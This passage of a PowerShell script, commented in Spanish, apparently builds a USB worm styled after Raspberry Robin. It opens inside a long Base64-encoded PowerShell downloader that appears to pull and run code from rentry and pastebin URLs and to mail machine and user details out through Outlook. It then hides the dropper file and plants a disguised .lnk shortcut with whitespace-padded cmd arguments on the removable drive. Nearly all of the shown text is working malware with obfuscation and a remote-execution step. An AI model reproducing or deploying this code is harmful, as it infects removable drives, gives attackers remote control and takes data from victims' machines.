RgBSADUAYwBHAFUAcABEAFEAbwBOAEMAaQBNAGsAYwBtAFYAegBkAFcAeAAwAFkAVwBSAHYASQBEADAAZwBJAGkAQQBrAEkARwBoADAAZABIAEIAegBPAGkAOAB2AGMAbQBWAHUAZABIAEoANQBMAG0ATgB2AEwAegBaADIAYQAyADkAeABMADMASgBoAGQAeQBJAE4AQwBpAE0AawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBJAEQAMABnAEkAaQBEAEQAcwBVAE0AZwBhAEgAUgAwAGMASABNADYATAB5ADkAdwBZAFgATgAwAFoAVwBKAHAAYgBpADUAagBiADIAMAB2AGMAbQBGADMATAAxAEkAMgBjADEAUgBGAE0ARQBkAEwASQBnADAASwBJADAATgBQAFQAVQBGAE8AUgBFADkAVABJAEEAMABLAEkAeQBBAGsASQBHAGgAMABkAEgAQgBwAGIAWABCAHMAYQBXAE4AaABJAEcAUgBsAGMAMgBOAGgAYwBtAGQAaABjAGkAQgA1AEkARwBWAHEAWgBXAE4AMQBkAEcARgB5AEkASABOAGoAYwBtAGwAdwBkAEMAQgBsAGEAbQBWAHQAYwBHAHgAdgBJAEMAUQBnAGEASABSADAAYwBIAE0ANgBMAHkAOQB3AFkAWABOADAAWgBXAEoAcABiAGkANQBqAGIAMgAwAHYAYwBtAEYAMwBMADAARgBDAGEAVgBZAHcAYwBrAGcAMwBEAFEAbwBqAEkATQBPAHgAUQB5AEIAcABiAFgAQgBzAGEAVwBOAGgASQBHAFoAcABjAG0AMQBoAFoARwA4AGcAWQAyADkAdQBJAEcAOQB3AFoAVwA1AHoAYwAyAHcAZwBaAFcANABnAFYAVgBKAE0ASQBNAE8AeABRAHkAQgBvAGQASABSAHcAYwB6AG8AdgBMADMAQgBoAGMAMwBSAGwAWQBtAGwAdQBMAG0ATgB2AGIAUwA5AHkAWQBYAGMAdgBVAGoAWgB6AFYARQBVAHcAUgAwAHMATgBDAGcAMABLAEQAUQBvAGsAYwBHAEYAMABjAG0AOQB1AEkARAAwAGcASgAxAHcAawBYAEgATgBvAGQASABSAHcAVwAxADUAYwBjADEAMAByAEoAdwAwAEsARABRAG8AagBVADIAawBnAGQARwBsAGwAYgBtAFUAZwBKAEMAQgBwAGIAWABCAHMAYQBXAE4AaABJAEcAUgBsAGMAMgBOAGgAYwBtAGQAaABjAGkAQgA1AEkARwBWAHEAWgBXAE4AMQBkAEcARgB5AEkASABOAGoAYwBtAGwAdwBkAEEAMABLAGEAVwBZAGcASwBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBMAFcAMQBoAGQARwBOAG8ASQBDAFIAdwBZAFgAUgB5AGIAMgA0AHAASQBIAHMATgBDAGkAQQBnAEkAQwBBAGsAZABYAEoAcwBJAEQAMABnAEoARwAxAGgAZABHAE4AbwBaAFgATgBiAE0ARgAwAGcATABYAEoAbABjAEcAeABoAFkAMgBVAGcASgAxAHcAawBLAHkAYwBzAEkAQwBjAG4ARABRAG8AZwBJAEMAQQBnAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBBADkASQBDAEoAcABaAFgAZwBnAEsARwBsADMAYwBpAEEAawBkAFgASgBzAEkAQwAxAFYAYwAyAFYAQwBZAFgATgBwAFkAMQBCAGgAYwBuAE4AcABiAG0AYwBwAEwAawBOAHYAYgBuAFIAbABiAG4AUQBpAEQAUQBvAGcASQBDAEEAZwBWADMASgBwAGQARwBVAHQAVAAzAFYAMABjAEgAVgAwAEkAQwBKAEQAYgAyADEAaABiAG0AUgB2AEkAQwBRAGcATwBpAEkAawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBEAFEAcAA5AEQAUQBvAE4AQwBpAE0AZwBRAG4AVgB6AFkAMgBGAHkASQBIAE4AcABJAEcAVgBzAEkARwBOAHYAYgBXAEYAdQBaAEcAOABnAFkAMgA5AHQAYQBXAFYAdQBlAG0ARQBnAFkAMgA5AHUASQBNAE8AeABRAHcAMABLAEoASABCAGgAZABIAEoAdgBiAGkAQQA5AEkAQwBkAGUAdwA3AEYARABYAEgATQBuAEQAUQBvAE4AQwBpAE0AZwBVADIAawBnAFoAVwB3AGcAWQAyADkAdABZAFcANQBrAGIAeQBCAGoAYgAyADEAcABaAFcANQA2AFkAUwBCAGoAYgAyADQAZwB3ADcARgBEAEwAQwBCAHcAYwBtADkAagBaAFgATgBoAGMAaQBCAGoAYgAyADEAdgBJAEcATgB2AGIAVwBGAHUAWgBHADgAZwBZADIAbABtAGMAbQBGAGsAYgB3ADAASwBhAFcAWQBnAEsAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcATABXADEAaABkAEcATgBvAEkAQwBSAHcAWQBYAFIAeQBiADIANABwAEkASABzAE4AQwBpAEEAZwBJAEMAQQBqAEkARQBWADQAZABIAEoAaABaAFgASQBnAFoAVwB3AGcAWQAyADkAdQBkAEcAVgB1AGEAVwBSAHYASQBIAEIAdgBjADMAUgBsAGMAbQBsAHYAYwBpAEIAaABJAEMATABEAHMAVQBNAGkARABRAG8AZwBJAEMAQQBnAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBBADkASQBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAdQBVADMAVgBpAGMAMwBSAHkAYQBXADUAbgBLAEMAUgB3AGIAMwBOAHAAWQAyAGwAdgBiAGkAQQByAEkARABNAHAASQBBADAASwBJAEMAQQBnAEkAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcAUABTAEEAbwBhAFgAZAB5AEkAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcATABWAFYAegBaAFUASgBoAGMAMgBsAGoAVQBHAEYAeQBjADIAbAB1AFoAeQBrAHUAUQAyADkAdQBkAEcAVgB1AGQAQQAwAEsASQBDAEEAZwBJAEEAMABLAEkAQwBBAGcASQBDAFIAaABjAG0ATgBvAGEAWABaAHYAVgBHAFYAdABjAEcAOQB5AFkAVwB3AGcAUABTAEIAYgBVADMAbAB6AGQARwBWAHQATABrAGwAUABMAGwAQgBoAGQARwBoAGQATwBqAHAASABaAFgAUgBVAFoAVwAxAHcAUgBtAGwAcwBaAFUANQBoAGIAVwBVAG8ASwBRADAASwBJAEMAQQBnAEkARgB0AEoAVAB5ADUARwBhAFcAeABsAFgAVABvADYAVgAzAEoAcABkAEcAVgBCAGIARwB4AEMAZQBYAFIAbABjAHkAZwBrAFkAWABKAGoAYQBHAGwAMgBiADEAUgBsAGIAWABCAHYAYwBtAEYAcwBMAEMAQgBiAFEAMgA5AHUAZABtAFYAeQBkAEYAMAA2AE8AawBaAHkAYgAyADEAQwBZAFgATgBsAE4AagBSAFQAZABIAEoAcABiAG0AYwBvAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBrAHAARABRAG8ATgBDAGkAQQBnAEkAQwBBAGoAVgBrAFYAUwBTAFUAWgBKAFEAMAA4AGcAVQAwAGsAZwBWAEUAbABGAFQAawBVAGcAUwBVADUAVABWAEUARgBNAFEAVQBSAFAASQBFAFYATQBJAEUAOQBRAFIAVQA1AFQAVQAwAHcATgBDAGkAQQBnAEkAQwBBAGoASQBGAFoAbABjAG0AbABtAGEAVwBOAGgAYwBpAEIAegBhAFMAQgBQAGMARwBWAHUAVQAxAE4ATQBJAEcAVgB6AGQATQBPAGgASQBHAGwAdQBjADMAUgBoAGIARwBGAGsAYgB3ADAASwBJAEMAQQBnAEkAQwBSAHYAYwBHAFYAdQBjADMATgBzAFMAVwA1AHoAZABHAEYAcwBiAEcAVgBrAEkARAAwAGcAUgAyAFYAMABMAFUATgB2AGIAVwAxAGgAYgBtAFEAZwBiADMAQgBsAGIAbgBOAHoAYgBDAEEAdABSAFgASgB5AGIAMwBKAEIAWQAzAFIAcABiADIANABnAFUAMgBsAHMAWgBXADUAMABiAEgAbABEAGIAMgA1ADAAYQBXADUAMQBaAFEAMABLAEQAUQBvAGcASQBDAEEAZwBhAFcAWQBnAEsAQwAxAHUAYgAzAFEAZwBKAEcAOQB3AFoAVwA1AHoAYwAyAHgASgBiAG4ATgAwAFkAVwB4AHMAWgBXAFEAcABJAEgAcwBnAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkASABkAHAAYgBtAGQAbABkAEMAQgBwAGIAbgBOADAAWQBXAHgAcwBJAEMAMAB0AGEAVwBRAGcAVAAzAEIAbABiAGwATgBUAFQAQwA1AFAAYwBHAFYAdQBVADEATgBNAEQAUQBvAGcASQBDAEEAZwBmAFEAMABLAEkAQwBBAGcASQBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBQAFMAQgB2AGMARwBWAHUAYwAzAE4AcwBJAEgAQgByAFoAWABsADEAZABHAHcAZwBMAFgAWgBsAGMAbQBsAG0AZQBYAEoAbABZADIAOQAyAFoAWABJAGcATABXAGwAdQBJAEMAUgBoAGMAbQBOAG8AYQBYAFoAdgBWAEcAVgB0AGMARwA5AHkAWQBXAHcAZwBJAEMAMQBwAGIAbQB0AGwAZQBTAEIAdwBjAG0AbAAyAFkAWABSAGwATABtAFIAbABjAGcAMABLAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBBADAASwBEAFEAbwBnAEkAQwBBAGcASgBGAFIAcABkAEcAeABsAEkARAAwAGcASQBrAE4AMQBZADIAaABwAFEAbQBWAHkAYwBuAGwAUwBUADIASgBwAGIAaQBJAE4AQwBpAEEAZwBJAEMAQQBrAFQAVwBWAHoAYwAyAEYAbgBaAFMAQQA5AEkAQwBKAEUAWgBYAE4AagBhAFcAWgB5AFkAVwA1AGsAYgB5AEIAagBiADIAMQBoAGIAbQBSAHYASQBGAEoAdgBZAG0AbAB1AEkARQBOAHAAWgBuAEoAaABaAEcAOABpAEQAUQBvAGcASQBDAEEAZwBKAEYAUgA1AGMARwBVAGcAUABTAEEAaQBhAFcANQBtAGIAeQBJAGcARABRAG8AZwBJAEEAMABLAEkAQwBBAGcASQBGAHQAeQBaAFcAWgBzAFoAVwBOADAAYQBXADkAdQBMAG0ARgB6AGMAMgBWAHQAWQBtAHgANQBYAFQAbwA2AGIARwA5AGgAWgBIAGQAcABkAEcAaAB3AFkAWABKADAAYQBXAEYAcwBiAG0ARgB0AFoAUwBnAGkAVQAzAGwAegBkAEcAVgB0AEwAbABkAHAAYgBtAFIAdgBkADMATQB1AFIAbQA5AHkAYgBYAE0AaQBLAFMAQgA4AEkARwA5ADEAZABDADEAdQBkAFcAeABzAEQAUQBvAGcASQBDAEEAZwBKAEgAQgBoAGQARwBnAGcAUABTAEIASABaAFgAUQB0AFUASABKAHYAWQAyAFYAegBjAHkAQQB0AGEAVwBRAGcASgBIAEIAcABaAEMAQgA4AEkARgBOAGwAYgBHAFYAagBkAEMAMQBQAFkAbQBwAGwAWQAzAFEAZwBMAFUAVgA0AGMARwBGAHUAWgBGAEIAeQBiADMAQgBsAGMAbgBSADUASQBGAEIAaABkAEcAZwBOAEMAaQBBAGcASQBDAEEAawBhAFcATgB2AGIAaQBBADkASQBGAHQAVABlAFgATgAwAFoAVwAwAHUAUgBIAEoAaABkADIAbAB1AFoAeQA1AEoAWQAyADkAdQBYAFQAbwA2AFIAWABoADAAYwBtAEYAagBkAEUARgB6AGMAMgA5AGoAYQBXAEYAMABaAFcAUgBKAFkAMgA5AHUASwBDAFIAdwBZAFgAUgBvAEsAUQAwAEsASQBDAEEAZwBJAEMAUgB1AGIAMwBSAHAAWgBuAGsAZwBQAFMAQgB1AFoAWABjAHQAYgAyAEoAcQBaAFcATgAwAEkASABOADUAYwAzAFIAbABiAFMANQAzAGEAVwA1AGsAYgAzAGQAegBMAG0AWgB2AGMAbQAxAHoATABtADUAdgBkAEcAbABtAGUAVwBsAGoAYgAyADQATgBDAGkAQQBnAEkAQwBBAGsAYgBtADkAMABhAFcAWgA1AEwAbQBsAGoAYgAyADQAZwBQAFMAQQBrAGEAVwBOAHYAYgBnADAASwBJAEMAQQBnAEkAQwBSAHUAYgAzAFIAcABaAG4AawB1AGQAbQBsAHoAYQBXAEoAcwBaAFMAQQA5AEkAQwBSADAAYwBuAFYAbABEAFEAbwBnAEkAQwBBAGcASgBHADUAdgBkAEcAbABtAGUAUwA1AHoAYQBHADkAMwBZAG0ARgBzAGIARwA5AHYAYgBuAFIAcABjAEMAZwB4AE0AQwB3AGcASgBGAFIAcABkAEcAeABsAEwAQwBBAGsAVABXAFYAegBjADIARgBuAFoAUwB3AGcAVwAzAE4ANQBjADMAUgBsAGIAUwA1ADMAYQBXADUAawBiADMAZAB6AEwAbQBaAHYAYwBtADEAegBMAG4AUgB2AGIAMgB4ADAAYQBYAEIAcABZADIAOQB1AFgAVABvADYASgBGAFIANQBjAEcAVQBwAEQAUQBwADkARABRAG8ATgBDAG0AbABtAEkAQwBnAHQAYgBtADkAMABJAEYAdAB6AGQASABKAHAAYgBtAGQAZABPAGoAcABKAGMAMAA1ADEAYgBHAHgAUABjAGsAVgB0AGMASABSADUASwBDAFIARABiADIANQBtAFgAMgBWAHQAWQBXAGwAcwBLAFMAawBnAGUAdwAwAEsASQBDAEEAZwBJAEMAUgBqAGIAMgAxAHcAZABYAFIAbABjAGsAbAB1AFoAbQA4AGcAUABTAEIASABaAFgAUQB0AFYAMgAxAHAAVAAyAEoAcQBaAFcATgAwAEkAQwAxAEQAYgBHAEYAegBjAHkAQgBYAGEAVwA0AHoATQBsADkARABiADIAMQB3AGQAWABSAGwAYwBsAE4ANQBjADMAUgBsAGIAUQAwAEsASQBDAEEAZwBJAEMAUgBqAGIAMgAxAHcAZABYAFIAbABjAGsANQBoAGIAVwBVAGcAUABTAEEAawBZADIAOQB0AGMASABWADAAWgBYAEoASgBiAG0AWgB2AEwAawA1AGgAYgBXAFUAZwBEAFEAbwBnAEkAQwBBAGcASgBIAFYAegBaAFgASgBPAFkAVwAxAGwASQBEADAAZwBKAEcATgB2AGIAWABCADEAZABHAFYAeQBTAFcANQBtAGIAeQA1AFYAYwAyAFYAeQBUAG0ARgB0AFoAUQAwAEsARABRAG8AZwBJAEMAQQBnAEoARwBWAHQAWQBXAGwAcwBRAG0AOQBrAGUAUwBBADkASQBFAEEAaQBEAFEAcABKAGIAbQBaAHYAYwBtADEAaABZADIAbgBEAHMAMgA0AGcAWgBHAFUAZwBaAFcAcABsAFkAMwBWAGoAYQBjAE8AegBiAGkAQgBrAFoAUwBCAGoAYgAyADEAaABiAG0AUgB2AEkAQwBSAEQAYgAyADUAbQBYADAATgBvAFkAWABKAFQAWgBYAFEATgBDAGcAMABLAFIAWABGADEAYQBYAEIAdgBPAGkAQQBrAFkAMgA5AHQAYwBIAFYAMABaAFgASgBPAFkAVwAxAGwARABRAHAAVgBjADMAVgBoAGMAbQBsAHYATwBpAEEAawBkAFgATgBsAGMAawA1AGgAYgBXAFUATgBDAGsAOQB5AGEAVwBkAGwAYgBpAEIAawBaAFcAdwBnAFkAMgA5AHQAWQBXADUAawBiAHoAbwBnAEoARwBaAHkAYgAyADAATgBDAGsATgB2AGIAVwBGAHUAWgBHADgAZwBaAFcAcABsAFkAMwBWADAAWQBXAFIAdgBPAGkAQQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEQAUQBwAFEAYwBtADkAagBaAFgATgB2AGMAeQBCAGwAYgBpAEIAbABhAG0AVgBqAGQAVwBOAHAAdwA3AE4AdQBPAGcAMABLAEoAQwBoAEgAWgBYAFEAdABVAEgASgB2AFkAMgBWAHoAYwB5AEIAOABJAEYATgBsAGIARwBWAGoAZABDADEAUABZAG0AcABsAFkAMwBRAGcAVQBIAEoAdgBZADIAVgB6AGMAMAA1AGgAYgBXAFUAcwBTAFcAUQBzAFEAMQBCAFYATABGAGQAdgBjAG0AdABwAGIAbQBkAFQAWgBYAFEAZwBmAEMAQgBHAGIAMwBKAHQAWQBYAFEAdABWAEcARgBpAGIARwBVAGcAZgBDAEIAUABkAFgAUQB0AFUAMwBSAHkAYQBXADUAbgBLAFEAMABLAEQAUQBvAGkAUQBBADAASwBEAFEAbwBnAEkAQwBBAGcAZABIAEoANQBJAEgAcwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEoARwA5ADEAZABHAHgAdgBiADIAcwBnAFAAUwBCAE8AWgBYAGMAdABUADIASgBxAFoAVwBOADAASQBDADEARABiADIAMQBQAFkAbQBwAGwAWQAzAFEAZwBUADMAVgAwAGIARwA5AHYAYQB5ADUAQgBjAEgAQgBzAGEAVwBOAGgAZABHAGwAdgBiAGcAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAGIAVwBGAHAAYgBDAEEAOQBJAEMAUgB2AGQAWABSAHMAYgAyADkAcgBMAGsATgB5AFoAVwBGADAAWgBVAGwAMABaAFcAMABvAE0AQwBrAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASgBHADEAaABhAFcAdwB1AFYARwA4AGcAUABTAEEAawBRADIAOQB1AFoAbAA5AGwAYgBXAEYAcABiAEEAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAGIAVwBGAHAAYgBDADUAVABkAFcASgBxAFoAVwBOADAASQBEADAAZwBJAGwASgBsAGMARwA5AHkAZABHAFUAZwBKAEUATgB2AGIAbQBaAGYAUQAyAGgAaABjAGwATgBsAGQAQwBBAHQASQBDAFIAagBiADIAMQB3AGQAWABSAGwAYwBrADUAaABiAFcAVQBpAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBSAHQAWQBXAGwAcwBMAGsASgB2AFoASABrAGcAUABTAEEAawBaAFcAMQBoAGEAVwB4AEMAYgAyAFIANQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgB0AFkAVwBsAHMATABsAE4AbABiAG0AUQBvAEsAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGoAVwAxAE4ANQBjADMAUgBsAGIAUwA1AFMAZABXADUAMABhAFcAMQBsAEwAawBsAHUAZABHAFYAeQBiADMAQgB6AFoAWABKADIAYQBXAE4AbABjAHkANQBOAFkAWABKAHoAYQBHAEYAcwBYAFQAbwA2AFUAbQBWAHMAWgBXAEYAegBaAFUATgB2AGIAVQA5AGkAYQBtAFYAagBkAEMAZwBrAGIAMwBWADAAYgBHADkAdgBhAHkAawBnAEQAUQBvAGcASQBDAEEAZwBmAFEAMABLAEkAQwBBAGcASQBHAE4AaABkAEcATgBvAEkASABzAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcAVgAzAEoAcABkAEcAVQB0AFQAMwBWADAAYwBIAFYAMABJAEMASgBGAGMAbgBKAHYAYwBpAEIAaABiAEMAQgBsAGIAbgBaAHAAWQBYAEkAZwBaAFcAMQBoAGEAVwB3ADYASQBDAFIAZgBJAGcAMABLAEkAQwBBAGcASQBIADAATgBDAG4AMABOAEMAZwAwAEsAVgAzAEoAcABkAEcAVQB0AFQAMwBWADAAYwBIAFYAMABJAEMASgBEAFQAMAAxAEIAVABrAFIAUABPAGkASQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEQAUQBvAE4AQwBnADAASwBTAFcANQAyAGIAMgB0AGwATABVAFYANABjAEgASgBsAGMAMwBOAHAAYgAyADQAZwBKAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHcAMABLAEQAUQBvAE4AQwBnADAASwAiAH0AJwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuACkALgBTAGMAcgBpAHAAdAApACkAIAB8ACAAaQBlAHgA"
$lineas[$indice] = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded $downloader "

$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)



# Escribimos m�s caracteres absurdos
#Add-Content "$dropperPath" "$caracteres"





# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"

# Save the shortcut
$shortcut.Save()



if ($Conf_Ballon -eq $True) {

#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB CuchiRobineado"
#$Type = "info" 
$Type = "Warning" # Puedes usar: None, Info, Warning, Error
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
   
}
